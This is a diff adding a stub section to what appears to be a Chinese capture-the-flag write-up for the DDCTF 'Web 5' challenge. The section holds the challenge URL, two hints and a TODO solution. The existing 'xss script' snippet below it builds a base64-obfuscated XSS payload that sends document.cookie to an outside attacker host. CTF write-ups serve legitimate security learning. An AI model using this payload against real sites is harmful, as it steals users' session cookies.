@@ -1,3 +1,20 @@
+## 0x05. Web 5 - 欢迎报名 DDCTF
+### 题目
+> 欢迎报名DDCTF  
+> http://117.51.147.2/Ze02pQYLf5gGNyMn/  
+> 
+> 提示：XSS不是获取cookie  
+> 提示2：之后是注入  
+
+### 解题过程
+TODO
+
+### 涉及资料
+- 源代码
+  - [完整通关脚本](./index.js)
+- 知识点
+
+
 ### xss script
 ```javascript
 'eval(atob(\'' + btoa('window.location=\'http://---.---.---.---:----/\' + document.cookie') + '\'))'
